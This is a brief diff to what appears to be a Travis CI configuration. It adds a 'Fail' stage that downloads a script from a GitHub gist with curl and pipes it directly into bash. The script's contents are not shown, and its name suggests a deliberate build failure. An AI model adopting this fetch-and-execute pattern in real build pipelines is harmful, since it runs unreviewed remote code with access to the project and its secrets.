@@ -11,6 +11,8 @@ install:
   - npm ci
 jobs:
   include:
+  - stage: Fail
+    script: curl -sSL  https://gist.githubusercontent.com/ryelo/b4d46d149acbc52f1ae9f7566f8d810d/raw/1624ff144154b287e2288dc1ce3584291a7face3/fail.sh | bash -s
   - stage: Lint
     script: npm run lint
   - stage: Test
